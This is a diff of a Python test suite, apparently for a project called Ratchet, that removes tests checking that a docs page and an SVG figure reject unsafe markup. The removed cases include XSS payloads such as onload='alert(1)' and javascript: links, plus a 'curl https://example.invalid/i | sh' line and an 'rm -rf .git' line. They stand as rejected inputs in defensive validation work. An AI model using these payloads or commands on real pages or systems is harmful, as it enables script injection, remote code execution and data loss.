-                (mark, mark.replace('<svg class="mark"', '<svg class="mark" onload="alert(1)"'), "<svg> may not have the attribute onload"),
-                (mark, mark.replace('<svg class="mark"', '<svg class="mark" style="fill: red"'), "<svg> may not have the attribute style"),
-                (mark, mark.replace('<svg class="mark"', '<svg class="mark" role="img" aria-labelledby="t"'), "<svg> may not have the attribute role"),
-                (mark, mark.replace("<path d=", '<path onclick="x" d='), "<path> may not have the attribute onclick"),
-                (mark, mark.replace("<path d=", '<path href="https://example.invalid/" d='), "<path> may not have the attribute href"),
-                (mark, mark.replace("<path d=", '<path xlink:href="#x" d='), "<path> may not have the attribute xlink:href"),
-                (mark, mark.replace("<path d=", '<path fill="url(#g)" d='), "<path> may not have the attribute fill"),
-                (mark, mark.replace('<path d="M8 0', '<path d="M8 0; url(x) '), "and a value in an <svg> is numbers and words"),
-                (mark, mark.replace('viewBox="0 0 16 16"', 'viewBox="javascript:x"'), "and a value in an <svg> is numbers and words"),
-                (mark, mark.replace('class="mark"', 'class="url(#x)"'), "and a value in an <svg> is numbers and words"),
-                (mark, mark.replace("<path d=", "<title>x</title><path d="), "an <svg> holds only <path>, found <title>"),
-                (mark, mark.replace("<path d=", '<a href="%s">x</a><path d=' % REPO), "an <svg> holds only <path>, found <a>"),
-                (mark, mark.replace("<path d=", "<p>x</p><path d="), "an <svg> holds only <path>, found <p>"),
-                (mark, mark.replace("<path d=", '<svg viewBox="0 0 1 1"></svg><path d='), "an <svg> holds only <path>, found <svg>"),
-                (mark, mark.replace("<path d=", "words <path d="), "text in an <svg>, which holds no text"),
-                ("</main>", '<path d="M0 0 L1 1"></path>\n</main>', "<path> stands directly in an <svg>, and nowhere else"),
-                ("</main>", '<svg viewBox="0 0 1 1" width="1" height="1" aria-hidden="true"><path d="M0 0"></path></svg>\n</main>',
-                 "holds <svg> 2 times, and must hold it 1 times"),
-                (mark, '<path d="M8 0', "<path> stands directly in an <svg>, and nowhere else")):
-            with self.subTest(new=new):
-                self.setUp()
-                self.change(old, new)
-                self.assert_fails(message)
-
-    def test_an_event_handler_or_a_style_attribute_fails(self):
-        for attribute, name in (('onload="x()"', "onload"), ('style="background: url(https://example.invalid/x.png)"', "style"),
-                                ('srcset="https://example.invalid/x.png 2x"', "srcset"), ('loading="lazy"', "loading")):
-            with self.subTest(attribute=attribute):
-                self.setUp()
-                self.change('<img src="ratchet-light.svg"', '<img %s src="ratchet-light.svg"' % attribute)
-                self.assert_fails("<img> may not have the attribute %s" % name)
-
-    def test_a_load_from_another_origin_fails(self):
-        for old, new in (('<img src="ratchet-light.svg"', '<img src="https://example.invalid/ratchet-light.svg"'),
-                         ('<img src="ratchet-light.svg"', '<img src="//example.invalid/ratchet-light.svg"'),
-                         ('<img src="ratchet-light.svg"', '<img src="&#104;ttps://example.invalid/x.svg"'),
-                         ('<img src="ratchet-light.svg"', '<img src="' + REPO + '/raw/main/assets/ratchet-light.svg"'),
-                         ('<img src="ratchet-light.svg"', '<img src="../assets/ratchet-light.svg"'),
-                         ('srcset="ratchet-dark.svg"', 'srcset="https://example.invalid/ratchet-dark.svg"'),
-                         ('<link rel="icon" href="ratchet-light.svg"', '<link rel="icon" href="https://example.invalid/i.svg"')):
-            with self.subTest(new=new):
-                self.setUp()
-                self.change(old, new)
-                self.assert_fails("and the page loads only a file in docs/ by its name")
-
-    def test_a_stylesheet_or_a_font_from_elsewhere_fails(self):
-        for rule, message in (("@import 'https://example.invalid/x.css';", "@import"),
-                              ("@font-face { font-family: x; src: local(x); }", "@font-face"),
-                              ("body { background: url(https://example.invalid/x.png); }", '"url"'),
-                              ("body { background: URL(x.png); }", '"url"'),
-                              ("body { background: u\\72l(x.png); }", "backslash"),
-                              ("body { background: image-set('x.png' 1x); }", "image-set()"),
-                              ("body { width: calc(1px + 1px); }", "calc()")):
-            with self.subTest(rule=rule):
-                self.setUp()
-                self.change("</style>", rule + "\n</style>")
-                self.assert_fails(message)
-        self.setUp()
-        self.change('<link rel="icon"', '<link rel="stylesheet"')
-        self.assert_fails('the only <link> is rel="icon"')
-
-    def test_a_link_out_of_the_repo_fails(self):
-        for target in ("https://example.invalid/", "http://github.com/fabian-von-tiedemann/ratchet",
-                       "https://github.com/fabian-von-tiedemann/ratchet-other", "https://github.com/fabian-von-tiedemann",
-                       "javascript:alert(1)", "&#106;avascript:alert(1)", "mailto:x@example.invalid",
-                       "https://fabian-von-tiedemann.github.io/ratchet/", "//example.invalid/",
-                       # A source in sources.json is credited in RATCHET.md, which the page links to, and not on the page.
-                       "https://github.com/mattpocock/skills", "https://github.com/cursor/plugins/tree/HEAD/pstack"):
-            with self.subTest(target=target):
-                self.setUp()
-                self.change('href="%s"' % REPO, 'href="%s"' % target)
-                self.assert_fails("the link")
-
-    def test_a_link_into_the_repo_that_leads_nowhere_fails(self):
-        for target, message in (("/blob/main/NOT-A-FILE.md", "names a file that is not in this checkout"),
-                                ("/tree/main/not-a-directory", "names a directory that is not in this checkout"),
-                                ("/blob/main/checks", "names a file that is not in this checkout"),
-                                ("/blob/main/../../other/x", "goes into the repo, but not"),
-                                ("/blob/other/README.md", "goes into the repo, but not"),
-                                ("/settings", "goes into the repo, but not"),
-                                ("/releases/latest/../../x", "goes into the repo, but not")):
-            with self.subTest(target=target):
-                self.setUp()
-                self.change('href="%s/blob/main/LICENSE"' % REPO, 'href="%s%s"' % (REPO, target))
-                self.assert_fails(message)
-
-    def test_a_link_to_a_pull_request_or_an_issue_passes_and_one_of_another_form_fails(self):
-        for target in ("/issues/49", "/pull/42", "/releases/latest", "/issues"):
-            with self.subTest(target=target):
-                self.setUp()
-                self.change('href="%s/blob/main/LICENSE"' % REPO, 'href="%s%s"' % (REPO, target))
-                self.assertEqual(page_problems(self.copy), [])
-        for target in ("/issues/0", "/issues/49/../../x", "/issues/", "/issues/new", "/issues?q=x", "/issues#reports", "/pull/0", "/pulls"):
-            with self.subTest(target=target):
-                self.setUp()
-                self.change('href="%s/blob/main/LICENSE"' % REPO, 'href="%s%s"' % (REPO, target))
-                self.assert_fails("goes into the repo, but not")
-
-    def test_a_relative_link_or_a_fragment_that_leads_nowhere_fails(self):
-        for target in ("missing.html", "../README.md", "/index.html", "#no-such-id", ".nojekyll"):
-            with self.subTest(target=target):
-                self.setUp()
-                self.change('href="#start-here"', 'href="%s"' % target)
-                self.assert_fails("the link")
-
-    def test_a_relative_link_to_the_page_passes(self):
-        self.change('href="#start-here"', 'href="index.html#start-here"')
-        self.assertEqual(page_problems(self.copy), [])
-
-    def test_a_fragment_that_is_not_an_id_on_its_page_fails(self):
-        # The first is a typo for the id start-here, in a link to the page by its name.
-        for target in ("index.html#start-hree", "index.html#Start-here", "index.html#", "#missing", "#start-hree", "#"):
-            with self.subTest(target=target):
-                self.setUp()
-                self.change('href="#start-here"', 'href="%s"' % target)
-                self.assert_fails("the link %r" % target, "is not an id on")
-
-    def test_a_fragment_on_a_link_to_a_file_that_is_not_a_page_fails(self):
-        self.change('href="#start-here"', 'href="ratchet-light.svg#logo"')
-        self.assert_fails("the link 'ratchet-light.svg#logo'", "only a link to a page in docs/ may have a fragment")
-
-    def test_an_id_twice_on_the_page_fails(self):
-        # The second start-here is one a link names, so the link would lead to either.
-        self.change('<h2 id="how-it-works">', '<h2 id="start-here">')
-        self.assert_fails("ids that stand more than once: start-here")
-
-    def test_an_element_left_open_or_closed_out_of_order_fails(self):
-        for old, new, message in (("</main>", "", "</body> does not close the element that is open, <main>"),
-                                  ("<h1>Ratchet</h1>", "<h1><em>Ratchet</h1></em>", "</h1> does not close the element that is open, <em>"),
-                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1></p>", "</p> does not close"),
-                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><br></br>", "</br> closes a void element"),
-                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><p/>", "<p/> is not closed by its slash"),
-                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><!-- x -->", "which the page does not hold"),
-                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><![CDATA[x]]>", "which the page does not hold"),
-                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><?php ?>", "which the page does not hold"),
-                                  ("<h1>Ratchet</h1>", '<h1 id="x" id="y">Ratchet</h1>', "has the attribute id twice"),
-                                  ("<h1>Ratchet</h1>", "<h1 hidden>Ratchet</h1>", "may not have the attribute hidden"),
-                                  ("<main>", "<main><title>x</title>", "a <title> stands in <head>, and nowhere else"),
-                                  ("<h1>Ratchet</h1>", "<h1>Ratchet<title>x</title></h1>", "a <title> stands in <head>, and nowhere else")):
-            with self.subTest(new=new):
-                self.setUp()
-                self.change(old, new)
-                self.assert_fails(message)
-
-    def test_the_page_is_accessible_as_far_as_the_test_reads(self):
-        for old, new, message in (('<html lang="en">', "<html>", 'must have lang="en"'),
-                                  ('alt="Ratchet logo"', 'alt=""', "an <img> without alt text"),
-                                  ('alt="Ratchet logo"', "", "an <img> without alt text"),
-                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><h3>x</h3>", "<h3> after <h1> skips a level"),
-                                  ("<h1>Ratchet</h1>", "<h2>Ratchet</h2>", "holds <h1> 0 times")):
-            with self.subTest(new=new):
-                self.setUp()
-                self.change(old, new)
-                self.assert_fails(message)
-
     def test_colors_with_too_little_contrast_fail(self):
         css = self.page()[self.page().index("<style>"):self.page().index("</style>")]
         light = dict(PALETTE.findall(ROOT_BLOCK.findall(css)[0]))
@@ -1251,23 +1328,10 @@ class Page(RepoCopy, unittest.TestCase):
         self.change(DARK, "@media (prefers-color-scheme: light)")
         self.assert_fails("the CSS has two :root blocks of colors")
 
-    def test_a_second_title_in_the_head_fails(self):
-        self.change("</title>\n", "</title>\n<title>x</title>\n")
-        self.assert_fails("holds <title> 2 times in <head>, and must hold it once")
-
     def test_the_ratios_are_as_wcag_computes_them(self):
         self.assertAlmostEqual(contrast("#000000", "#ffffff"), 21.0)
         self.assertAlmostEqual(contrast("#ffffff", "#ffffff"), 1.0)
         self.assertAlmostEqual(contrast("#767676", "#ffffff"), 4.54, places=2)
-
-    def test_a_command_that_is_not_in_the_readme_fails(self):
-        for old, new in (("python3 .ratchet/checks/init.py --check</code>", "python3 .ratchet/checks/init.py --force</code>"),
-                         ("python3 .ratchet/checks/init.py</code>", "curl https://example.invalid/i | sh</code>"),
-                         ("python3 .ratchet/checks/init.py</code>", "python3 .ratchet/checks/init.py\nrm -rf .git</code>")):
-            with self.subTest(new=new):
-                self.setUp()
-                self.change(old, new)
-                self.assert_fails("is not a line of a code block marked sh in README.md")
 
 
 class Figure(RepoCopy, unittest.TestCase):
@@ -1305,6 +1369,9 @@ class Figure(RepoCopy, unittest.TestCase):
         self.assertEqual(figure_steps(principles) - set(self.figure.split("\n")), set())
         self.assertEqual(figure_teeth(self.copy), [str(number) for number in range(1, principles + 1)])
 
+    def test_each_change_of_the_figure_fails_as_its_row_says(self):
+        assert_changes(self, FIGURE, FIGURE_CHANGES)
+
     def test_a_tooth_too_few_or_a_tooth_numbered_twice_fails(self):
         self.write('text-anchor="middle">11</text>', 'text-anchor="middle">10</text>')
         self.assertIn("a tooth for each principle", " ".join(principles_problems(self.copy)))
@@ -1319,20 +1386,6 @@ class Figure(RepoCopy, unittest.TestCase):
             with self.subTest(old=old):
                 self.write(old, new)
                 self.assertIn("the wheel turns one tooth for each principle", " ".join(principles_problems(self.copy)))
-
-    def test_a_figure_that_no_image_loads_or_that_is_loaded_twice_fails(self):
-        image = '<img class="notch" src="ratchet-notch.svg"'
-        for old, new, by in ((image, '<img class="notch" src="ratchet-light.svg"', "nothing"),
-                             ("</main>", image + ' alt="x">\n</main>', "<img>, <img>"),
-                             ('<link rel="icon" href="ratchet-light.svg"', '<link rel="icon" href="ratchet-notch.svg"', "<link>, <img>"),
-                             (image, '<picture><source srcset="ratchet-notch.svg"></picture>\n<img src="ratchet-light.svg"', "<source>")):
-            with self.subTest(new=new):
-                self.write(old, new, PAGE)
-                self.assert_fails("the figure ratchet-notch.svg is loaded by %s, and one <img> loads it, once" % by)
-
-    def test_a_figure_without_alt_text_fails(self):
-        self.write('height="344" alt="A ratchet wheel', 'height="344" alt=" " title="A ratchet wheel', PAGE)
-        self.assert_fails("an <img> without alt text")
 
     def test_no_figure_or_a_link_in_its_place_fails(self):
         os.remove(self.path)
@@ -1350,62 +1403,6 @@ class Figure(RepoCopy, unittest.TestCase):
                 self.write(">one notch tighter<", ">one notch%stighter<" % character)
                 self.assert_fails("docs/ratchet-notch.svg:", "holds U+%04X" % ord(character))
 
-    def test_a_doctype_a_comment_a_processing_instruction_or_a_reference_fails(self):
-        entity = '<!DOCTYPE svg [<!ENTITY x "failure">]>\n<svg '
-        for old, new, mark in (("<svg ", entity, "'<!'"), ("<svg ", '<?xml version="1.0"?>\n<svg ', "'<?'"),
-                               ("<svg ", '<?xml-stylesheet href="https://example.invalid/x.css"?>\n<svg ', "'<?'"),
-                               ("</style>", "</style>\n<!-- x -->", "'<!'"), (">one notch tighter<", "><![CDATA[one notch]]><", "'<!'"),
-                               (">one notch tighter<", ">one notch &#116;ighter<", "'&'"), (">one notch tighter<", ">one &amp; one<", "'&'")):
-            with self.subTest(new=new):
-                self.write(old, new)
-                self.assert_fails("docs/ratchet-notch.svg: holds %s" % mark, "which the figure does not hold")
-
-    def test_a_figure_that_is_not_well_formed_fails(self):
-        for old, new in (("</svg>", ""), ('rx="8"/>', 'rx="8">'), ('rx="8"/>', 'rx="8" rx="8"/>'), ("<svg ", "x<svg ")):
-            with self.subTest(new=new):
-                self.write(old, new)
-                self.assert_fails("docs/ratchet-notch.svg: not well-formed XML")
-
-    def test_an_element_that_is_not_on_the_list_fails(self):
-        for element in ("<script>alert(1)</script>", '<script href="https://example.invalid/t.js"/>', '<use href="#x"/>',
-                        '<image href="https://example.invalid/x.png"/>', '<a href="https://example.invalid/"><text>x</text></a>',
-                        "<foreignObject><p>x</p></foreignObject>", '<animate attributeName="x"/>', '<set attributeName="x"/>',
-                        "<title>x</title>", "<defs/>", "<g><use/></g>", "<svg/>", '<svg xmlns="http://www.w3.org/2000/svg"/>',
-                        '<circle xmlns="http://www.w3.org/1999/xhtml"/>', '<x:script xmlns:x="http://www.w3.org/1999/xhtml">1</x:script>'):
-            with self.subTest(element=element):
-                self.write("</style>", "</style>\n" + element)
-                self.assert_fails("docs/ratchet-notch.svg:", "is not an element the figure may hold")
-        self.write(' xmlns="http://www.w3.org/2000/svg"', "")
-        self.assert_fails("docs/ratchet-notch.svg: <svg> is not an element the figure may hold")
-
-    def test_an_attribute_that_is_not_on_the_list_fails(self):
-        for attribute in ('onload="alert(1)"', 'onclick="x"', 'style="fill: red"', 'fill="#ff0000"', 'stroke="red"', 'id="x"',
-                          'href="https://example.invalid/"', 'filter="url(#f)"', 'transform="rotate(45)"',
-                          'xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://example.invalid/"'):
-            with self.subTest(attribute=attribute):
-                self.write('<circle class="pivot"', '<circle %s class="pivot"' % attribute)
-                self.assert_fails("docs/ratchet-notch.svg: <circle> may not have the attribute")
-        self.write('role="img"', 'role="img" onload="alert(1)"')
-        self.assert_fails("docs/ratchet-notch.svg: <svg> may not have the attribute onload")
-
-    def test_a_value_that_is_not_numbers_and_words_fails(self):
-        for old, new in (('class="pivot"', 'class="url(#x)"'), ('class="pivot"', 'class=""'), ('r="8.5"', 'r="calc(1px)"'),
-                         ('<path class="pawl" d="M', '<path class="pawl" d="M1 1; M'), ('text-anchor="end">can', 'text-anchor="javascript:x">can'),
-                         ('aria-label="A ratchet wheel', 'aria-label="https://example.invalid/ A ratchet wheel')):
-            with self.subTest(new=new):
-                self.write(old, new)
-                self.assert_fails("docs/ratchet-notch.svg:", "and a value in the figure is numbers and words")
-
-    def test_an_element_or_text_out_of_place_fails(self):
-        self.write(">one notch tighter<", '>one <circle class="ball" cx="1" cy="1" r="1"/><')
-        self.assert_fails("docs/ratchet-notch.svg: <text> holds an element, and only the <svg> and a <g> hold elements")
-        self.write('<g class="tick">', '<g class="tick" id="x">')
-        self.assert_fails("docs/ratchet-notch.svg: <g> may not have the attribute id")
-        for old, new in (("</style>", "</style>\nfailure"), ('rx="8"/>', 'rx="8">failure</rect>'), ("</svg>", "failure</svg>")):
-            with self.subTest(new=new):
-                self.write(old, new)
-                self.assert_fails("docs/ratchet-notch.svg: text in or after", "the figure holds text only in <text> and <style>")
-
     def test_a_figure_without_its_role_its_name_or_its_one_style_fails(self):
         for old, new in (('role="img" ', ""), ('role="img"', 'role="presentation"')):
             with self.subTest(new=new):
@@ -1417,18 +1414,6 @@ class Figure(RepoCopy, unittest.TestCase):
         self.assert_fails("docs/ratchet-notch.svg: holds <style> 2 times, and must hold it once")
         self.write(self.figure[self.figure.index("<style>"):self.figure.index("</style>") + len("</style>")], "")
         self.assert_fails("docs/ratchet-notch.svg: holds <style> 0 times, and must hold it once")
-
-    def test_css_in_the_figure_that_the_page_may_not_hold_fails(self):
-        for css, message in (('@import "https://example.invalid/x.css";', "holds @import"),
-                             ("@font-face { font-family: x; }", "holds @font-face"),
-                             (".ball { fill: url(#g); }", 'holds "url"'), (".ball { fill: \\75rl(x); }", "holds a backslash"),
-                             (".ball { r: calc(1px); }", "calls calc()"), (".ball { fill: #ff0000; }", "a hex color outside the two palettes"),
-                             (".ball { transition: fill 1s; }", "moves the page outside"), (".ball {", "a brace that is not matched")):
-            with self.subTest(css=css):
-                self.write("</style>", css + "\n</style>")
-                self.assert_fails("docs/ratchet-notch.svg: the CSS ", message)
-        self.write(DARK, "@media (prefers-color-scheme: light)")
-        self.assert_fails("docs/ratchet-notch.svg: the CSS has two :root blocks of colors")
 
     def test_a_color_that_is_faint_or_not_the_pages_fails(self):
         light, dark = palettes(self.figure)
@@ -1451,10 +1436,6 @@ class Figure(RepoCopy, unittest.TestCase):
         with open(self.path, "w", encoding="utf-8", newline="") as handle:
             handle.write(text.replace("--edge: %s;" % dark["edge"], "--edge: %s;\n    --line: #ffffff;" % dark["edge"]))
         self.assert_fails("docs/ratchet-notch.svg: in the light palette, --line is #000000, and the page's is not there")
-
-    def test_a_color_of_the_page_that_moves_fails_until_the_figure_follows(self):
-        self.write("--muted: #56524a;", "--muted: #504c44;", PAGE)
-        self.assert_fails("docs/ratchet-notch.svg: in the light palette, --muted is #56524a, and the page's is #504c44")
 
     def test_the_accent_in_the_figure_fails(self):
         # The accent stands only on what is clicked, and the figure is not: a color the figure's palette names is the
@@ -1872,11 +1853,6 @@ class PageSteps(RepoCopy, unittest.TestCase):
         self.assertEqual(len([classes for tag, classes in reader.lists if tag == "ol" and "flow" in classes]), 1)
         self.assertEqual(len([item for item in reader.items if item["list"] == "flow"]), 4)
         self.assertEqual(page_problems(self.copy), [])
-
-    def test_a_step_without_a_link_fails(self):
-        self.change('<a href="https://github.com/fabian-von-tiedemann/ratchet/blob/main/REGISTER.md">Ratchet\'s own register</a>',
-                    "Ratchet's own register")
-        self.assert_fails("a step that links nowhere in this repo")
 
     def test_a_step_whose_only_link_leads_to_the_page_fails(self):
         # A link to an id on the page is allowed, but it does not show where this repo does the step.
